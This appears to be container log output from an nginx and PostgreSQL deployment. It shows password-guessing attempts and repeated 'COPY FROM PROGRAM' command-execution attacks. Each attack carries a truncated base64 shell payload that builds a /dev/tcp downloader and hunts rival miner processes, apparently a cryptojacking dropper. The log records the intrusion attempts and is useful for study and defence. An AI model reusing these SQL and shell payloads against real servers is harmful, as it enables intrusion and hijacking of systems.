nginx-1  | 176.65.139.66 - - [21/Jun/2026:08:27:00 +0000] "GET / HTTP/1.0" 302 0 "-" "Shodan-Pull/1.0"
db-1     | 2026-06-21 02:52:52.732 UTC [1602] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 02:56:37.094 UTC [1603] FATAL:  password authentication failed for user "administrator"
db-1     | 2026-06-21 02:56:37.094 UTC [1603] DETAIL:  Role "administrator" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 02:58:05.676 UTC [1604] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 02:58:05.676 UTC [1604] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 02:58:17.210 UTC [1605] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 02:58:17.210 UTC [1605] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 02:58:39.186 UTC [1] LOG:  server process (PID 1606) was terminated by signal 9: Killed
db-1     | 2026-06-21 02:58:39.186 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-21 02:58:39.187 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-21 02:58:39.189 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-21 02:58:39.221 UTC [1611] LOG:  database system was interrupted; last known up at 2026-06-21 02:34:59 UTC
db-1     | 2026-06-21 02:58:39.292 UTC [1611] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-21 02:58:39.296 UTC [1611] LOG:  redo starts at 0/1C980C0
db-1     | 2026-06-21 02:58:39.296 UTC [1611] LOG:  invalid record length at 0/1C980F8: expected at least 24, got 0
db-1     | 2026-06-21 02:58:39.296 UTC [1611] LOG:  redo done at 0/1C980C0 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-21 02:58:39.303 UTC [1612] LOG:  checkpoint starting: end-of-recovery immediate wait
db-1     | 2026-06-21 02:58:39.328 UTC [1612] LOG:  checkpoint complete: wrote 3 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.005 s, sync=0.003 s, total=0.028 s; sync files=2, longest=0.002 s, average=0.002 s; distance=0 kB, estimate=0 kB; lsn=0/1C980F8, redo lsn=0/1C980F8
db-1     | 2026-06-21 02:58:39.334 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-21 03:00:29.013 UTC [1617] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 03:00:29.013 UTC [1617] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:02:00.206 UTC [1618] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 03:02:00.206 UTC [1618] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:02:00.530 UTC [1619] FATAL:  password authentication failed for user "administrator"
db-1     | 2026-06-21 03:02:00.530 UTC [1619] DETAIL:  Role "administrator" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:05:09.301 UTC [1] LOG:  server process (PID 1620) was terminated by signal 9: Killed
db-1     | 2026-06-21 03:05:09.301 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-21 03:05:09.302 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-21 03:05:09.304 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-21 03:05:09.342 UTC [1624] LOG:  database system was interrupted; last known up at 2026-06-21 02:58:39 UTC
db-1     | 2026-06-21 03:05:09.411 UTC [1624] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-21 03:05:09.416 UTC [1624] LOG:  redo starts at 0/1C98170
db-1     | 2026-06-21 03:05:09.417 UTC [1624] LOG:  invalid record length at 0/1C981A8: expected at least 24, got 0
db-1     | 2026-06-21 03:05:09.417 UTC [1624] LOG:  redo done at 0/1C98170 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-21 03:05:09.425 UTC [1625] LOG:  checkpoint starting: end-of-recovery immediate wait
db-1     | 2026-06-21 03:05:09.449 UTC [1625] LOG:  checkpoint complete: wrote 3 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.008 s, sync=0.004 s, total=0.028 s; sync files=2, longest=0.002 s, average=0.002 s; distance=0 kB, estimate=0 kB; lsn=0/1C981A8, redo lsn=0/1C981A8
db-1     | 2026-06-21 03:05:09.456 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-21 03:05:56.684 UTC [1630] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 03:05:56.684 UTC [1630] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:06:10.623 UTC [1631] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 03:06:10.623 UTC [1631] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:06:27.604 UTC [1] LOG:  server process (PID 1632) was terminated by signal 9: Killed
db-1     | 2026-06-21 03:06:27.604 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-21 03:06:27.604 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-21 03:06:27.607 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-21 03:06:27.635 UTC [1634] LOG:  database system was interrupted; last known up at 2026-06-21 03:05:09 UTC
db-1     | 2026-06-21 03:06:27.703 UTC [1634] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-21 03:06:27.708 UTC [1634] LOG:  redo starts at 0/1C98220
db-1     | 2026-06-21 03:06:27.708 UTC [1634] LOG:  invalid record length at 0/1C98258: expected at least 24, got 0
db-1     | 2026-06-21 03:06:27.708 UTC [1634] LOG:  redo done at 0/1C98220 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-21 03:06:27.716 UTC [1635] LOG:  checkpoint starting: end-of-recovery immediate wait
db-1     | 2026-06-21 03:06:27.738 UTC [1635] LOG:  checkpoint complete: wrote 3 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.005 s, sync=0.003 s, total=0.027 s; sync files=2, longest=0.002 s, average=0.002 s; distance=0 kB, estimate=0 kB; lsn=0/1C98258, redo lsn=0/1C98258
db-1     | 2026-06-21 03:06:27.745 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-21 03:07:23.073 UTC [1640] FATAL:  password authentication failed for user "administrator"
db-1     | 2026-06-21 03:07:23.073 UTC [1640] DETAIL:  Role "administrator" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:09:57.541 UTC [1641] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 03:09:57.541 UTC [1641] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:09:59.284 UTC [1642] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 03:09:59.284 UTC [1642] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:12:46.046 UTC [1644] FATAL:  password authentication failed for user "administrator"
db-1     | 2026-06-21 03:12:46.046 UTC [1644] DETAIL:  Role "administrator" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:12:52.860 UTC [1643] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 03:12:52.860 UTC [1643] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:13:03.755 UTC [1645] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 03:13:03.755 UTC [1645] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:13:23.582 UTC [1] LOG:  server process (PID 1646) was terminated by signal 9: Killed
db-1     | 2026-06-21 03:13:23.582 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-21 03:13:23.582 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-21 03:13:23.585 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-21 03:13:23.612 UTC [1648] LOG:  database system was interrupted; last known up at 2026-06-21 03:06:27 UTC
db-1     | 2026-06-21 03:13:23.676 UTC [1648] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-21 03:13:23.680 UTC [1648] LOG:  redo starts at 0/1C982D0
db-1     | 2026-06-21 03:13:23.683 UTC [1648] LOG:  invalid magic number 0000 in WAL segment 000000010000000000000001, LSN 0/1CB4000, offset 13320192
db-1     | 2026-06-21 03:13:23.683 UTC [1648] LOG:  redo done at 0/1CB2218 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-21 03:13:23.691 UTC [1649] LOG:  checkpoint starting: end-of-recovery immediate wait
db-1     | 2026-06-21 03:13:23.715 UTC [1649] LOG:  checkpoint complete: wrote 27 buffers (0.2%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.005 s, sync=0.008 s, total=0.027 s; sync files=23, longest=0.004 s, average=0.001 s; distance=111 kB, estimate=111 kB; lsn=0/1CB4048, redo lsn=0/1CB4048
db-1     | 2026-06-21 03:13:23.721 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-21 03:16:34.859 UTC [1654] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 03:16:34.859 UTC [1654] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:16:39.907 UTC [1655] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 03:16:39.907 UTC [1655] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:18:09.121 UTC [1656] FATAL:  password authentication failed for user "administrator"
db-1     | 2026-06-21 03:18:09.121 UTC [1656] DETAIL:  Role "administrator" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:21:12.984 UTC [1657] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 03:21:12.984 UTC [1657] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:21:27.971 UTC [1658] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 03:21:27.971 UTC [1658] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:23:31.816 UTC [1659] FATAL:  password authentication failed for user "administrator"
db-1     | 2026-06-21 03:23:31.816 UTC [1659] DETAIL:  Role "administrator" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:28:10.956 UTC [1660] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 03:28:10.956 UTC [1660] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:28:31.331 UTC [1661] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 03:28:31.331 UTC [1661] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:28:53.770 UTC [1662] FATAL:  password authentication failed for user "administrator"
db-1     | 2026-06-21 03:28:53.770 UTC [1662] DETAIL:  Role "administrator" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:34:15.777 UTC [1663] FATAL:  password authentication failed for user "administrator"
db-1     | 2026-06-21 03:34:15.777 UTC [1663] DETAIL:  Role "administrator" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:34:51.851 UTC [1664] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 03:34:51.851 UTC [1664] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:35:05.118 UTC [1665] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 03:35:05.118 UTC [1665] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:39:38.709 UTC [1666] FATAL:  password authentication failed for user "administrator"
db-1     | 2026-06-21 03:39:38.709 UTC [1666] DETAIL:  Role "administrator" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:41:47.432 UTC [1667] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 03:41:47.432 UTC [1667] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:41:48.939 UTC [1668] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 03:41:48.939 UTC [1668] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:45:01.490 UTC [1669] FATAL:  password authentication failed for user "administrator"
db-1     | 2026-06-21 03:45:01.490 UTC [1669] DETAIL:  Role "administrator" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:47:08.453 UTC [1671] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 03:47:08.453 UTC [1671] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:47:13.289 UTC [1672] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 03:47:13.289 UTC [1672] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:47:20.502 UTC [1670] FATAL:  canceling authentication due to timeout
db-1     | 2026-06-21 03:47:34.153 UTC [1] LOG:  server process (PID 1673) was terminated by signal 9: Killed
db-1     | 2026-06-21 03:47:34.153 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-21 03:47:34.153 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-21 03:47:34.157 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-21 03:47:34.193 UTC [1675] LOG:  database system was interrupted; last known up at 2026-06-21 03:13:23 UTC
db-1     | 2026-06-21 03:47:34.269 UTC [1675] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-21 03:47:34.278 UTC [1675] LOG:  redo starts at 0/1CB40C0
db-1     | 2026-06-21 03:47:34.278 UTC [1675] LOG:  invalid record length at 0/1CB40F8: expected at least 24, got 0
db-1     | 2026-06-21 03:47:34.278 UTC [1675] LOG:  redo done at 0/1CB40C0 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-21 03:47:34.297 UTC [1676] LOG:  checkpoint starting: end-of-recovery immediate wait
db-1     | 2026-06-21 03:47:34.345 UTC [1676] LOG:  checkpoint complete: wrote 3 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.016 s, sync=0.003 s, total=0.054 s; sync files=2, longest=0.002 s, average=0.002 s; distance=0 kB, estimate=0 kB; lsn=0/1CB40F8, redo lsn=0/1CB40F8
db-1     | 2026-06-21 03:47:34.359 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-21 03:50:23.934 UTC [1681] FATAL:  password authentication failed for user "administrator"
db-1     | 2026-06-21 03:50:23.934 UTC [1681] DETAIL:  Role "administrator" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:54:53.954 UTC [1682] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 03:54:53.954 UTC [1682] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:54:54.573 UTC [1683] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 03:54:54.573 UTC [1683] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:54:56.356 UTC [1] LOG:  server process (PID 1684) was terminated by signal 9: Killed
db-1     | 2026-06-21 03:54:56.356 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
